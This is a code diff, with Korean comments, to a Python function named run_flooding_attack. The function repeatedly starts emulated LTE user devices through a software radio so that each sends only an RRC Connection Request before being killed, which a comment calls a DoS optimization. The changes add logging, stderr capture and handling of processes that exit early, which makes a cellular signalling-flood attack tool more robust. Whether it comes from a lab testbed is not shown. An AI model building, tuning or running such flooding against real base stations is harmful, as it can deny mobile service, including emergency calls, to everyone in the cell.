@@ -146,7 +146,13 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
     max_process_wait_time = 2.0  # 각 프로세스당 최대 2초 대기 (RRC Request만 보내고 종료)
     
     try:
+        loop_count = 0
         while running_flag is None or running_flag():
+            loop_count += 1
+            # 첫 번째 루프에서 상태 확인
+            if loop_count == 1:
+                logger.info("공격 루프 시작...")
+            
             # 현재 프로세스가 없거나 종료되었으면 다음 UE 실행
             if current_process is None or current_process.poll() is not None:
                 # 이전 프로세스가 있으면 정리
@@ -179,6 +185,7 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
                         logger.info(f"  USIM OPC: {'설정됨' if usim_opc else '없음'}")
                         logger.info(f"  USIM K: {'설정됨' if usim_k else '없음'}")
                         logger.info(f"  EARFCN: {earfcn if earfcn else '자동 스캔'}")
+                        logger.info(f"프로세스 시작 완료. 로그 파일 생성 대기 중...")
                     
                     ue_id += 1
                     if (ue_id - 1) % 50 == 0:
@@ -193,6 +200,7 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
                 elapsed = time.time() - process_start_time
                 if elapsed > max_process_wait_time:
                     # 타임아웃: 다음 config로 이동
+                    logger.info(f"UE 타임아웃 (경과: {elapsed:.2f}초) → 다음 UE로 이동")
                     if current_process.poll() is None:
                         current_process.terminate()
                         try:
@@ -207,13 +215,21 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
             # RRC Connection Request 전송 확인 (DoS 최적화: Request만 보내고 즉시 종료)
             if current_process:
                 # 프로세스가 종료되었는지 먼저 확인
-                if current_process.poll() is not None:
+                poll_result = current_process.poll()
+                if poll_result is not None:
                     # 프로세스가 종료됨
                     elapsed = time.time() - process_start_time if process_start_time else 0
                     return_code = current_process.returncode
                     logger.info(f"UE 프로세스가 종료됨 (경과: {elapsed:.2f}초, 종료 코드: {return_code})")
                     if return_code != 0:
                         logger.warning(f"UE 프로세스가 비정상 종료 (종료 코드: {return_code})")
+                        # stderr 확인
+                        try:
+                            stderr_output = current_process.stderr.read().decode('utf-8', errors='ignore') if current_process.stderr else ""
+                            if stderr_output:
+                                logger.warning(f"프로세스 stderr: {stderr_output[:500]}")
+                        except:
+                            pass
                     current_process = None
                     process_start_time = None
                     current_log_file = None
@@ -285,8 +301,15 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
                 elif current_log_file:
                     # 로그 파일이 아직 생성되지 않음
                     elapsed = time.time() - process_start_time if process_start_time else 0
-                    if elapsed > 1.0 and int(elapsed) % 2 == 0:  # 2초마다 한 번씩 로그
-                        logger.debug(f"로그 파일 대기 중: {current_log_file} (경과: {elapsed:.1f}초)")
+                    # 프로세스 상태 확인
+                    if current_process.poll() is not None:
+                        logger.warning(f"프로세스가 종료됨 (로그 파일 생성 전, 경과: {elapsed:.2f}초, 종료 코드: {current_process.returncode})")
+                        current_process = None
+                        process_start_time = None
+                        current_log_file = None
+                        continue
+                    elif elapsed > 1.0 and int(elapsed) % 2 == 0:  # 2초마다 한 번씩 로그
+                        logger.info(f"로그 파일 대기 중: {current_log_file} (경과: {elapsed:.1f}초, 프로세스 실행 중)")
             
             # 짧은 대기 후 다시 확인
             
